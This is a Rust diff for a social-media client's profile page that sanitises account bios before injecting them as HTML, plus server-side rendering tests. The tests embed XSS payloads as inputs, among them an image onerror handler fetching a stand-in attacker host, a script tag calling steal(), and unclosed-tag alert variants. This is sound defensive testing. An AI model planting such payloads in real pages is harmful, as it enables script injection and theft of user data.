@@ -74,10 +74,11 @@ pub fn ProfilePage(
         "{} posts · {} following · {} followers",
         account.statuses_count, account.following_count, account.followers_count,
     );
-    // The bio is HTML from the instance, already sanitised by the model: drawing it as text
-    // would show a reader the tags instead of the links, and `inner_html` is the one honest
-    // way to put it in. An empty note draws no paragraph rather than an empty one.
-    let bio = account.note.clone();
+    // The bio is HTML from the instance, sanitised here before `inner_html`: drawing it as
+    // text would show a reader the tags instead of the links, and `inner_html` is safe once
+    // filtered through the shared allowlist. An empty note draws no paragraph rather than an
+    // empty one.
+    let bio = nodus_ui::html::body(&account.note);
     let has_bio = !bio.is_empty();
     let header = account.header.clone();
     let has_header = !header.is_empty();
@@ -274,4 +275,75 @@ fn default_card(status: Status, age_of: Option<Callback<String, String>>) -> Any
         />
     }
     .into_any()
+}
+
+#[cfg(test)]
+mod tests {
+    use leptos::prelude::{Owner, RenderHtml as _, Signal};
+    use nodus_client_core::model::Account;
+
+    use super::{ProfilePage, ProfilePageProps};
+
+    fn render_profile_note(note: &str) -> String {
+        let account = Account {
+            id: "1".to_owned(),
+            acct: "alice@example.org".to_owned(),
+            display_name: "Alice".to_owned(),
+            note: note.to_owned(),
+            avatar: String::new(),
+            header: String::new(),
+            bot: false,
+            locked: false,
+            followers_count: 0,
+            following_count: 0,
+            statuses_count: 0,
+            last_status_at: None,
+            discoverable: None,
+            indexable: None,
+            noindex: None,
+        };
+        Owner::new().with(|| {
+            let statuses = Signal::derive(Vec::new);
+            ProfilePage(ProfilePageProps {
+                account,
+                relationship: None,
+                statuses,
+                show_statuses: true,
+                tabs: None,
+                after: None,
+                card: None,
+                age_of: None,
+                on_follow: None,
+                on_mute: None,
+                on_block: None,
+                on_avatar: None,
+                show_verbs: false,
+            })
+            .to_html()
+        })
+    }
+
+    #[test]
+    fn profile_page_sanitizes_account_note_xss() {
+        let rendered = render_profile_note(
+            "<p>bio</p><img src=x onerror=\"fetch('https://attacker.tld')\"><script>steal()</script>",
+        );
+        assert!(!rendered.contains("onerror"), "{rendered}");
+        assert!(!rendered.contains("attacker.tld"), "{rendered}");
+        assert!(!rendered.contains("<script"), "{rendered}");
+        assert!(rendered.contains("<p>bio</p>"), "{rendered}");
+    }
+
+    #[test]
+    fn profile_page_blocks_unclosed_tag_and_open_quote_xss_on_ssr() {
+        for payload in [
+            "<img src=x onerror=\"alert(1)\" ",
+            "<img src=x onerror=\"alert(1)\" alt=\"",
+        ] {
+            let rendered = render_profile_note(payload);
+            assert!(!rendered.contains("<img"), "{rendered}");
+            assert!(!rendered.contains("onerror"), "{rendered}");
+            assert!(!rendered.contains("alert(1)"), "{rendered}");
+        }
+    }
 }
